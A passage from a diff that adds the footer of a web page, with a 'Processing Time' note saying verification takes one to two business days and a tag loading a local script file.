+                        security measures.</p>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Processing Time</h3>
+                    <p class="text-gray-300 text-sm">Verification typically takes 1-2 business days. You'll receive an
+                        email confirmation once approved.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+<script src="./script.js"></script>
 </body>
 
 </html>
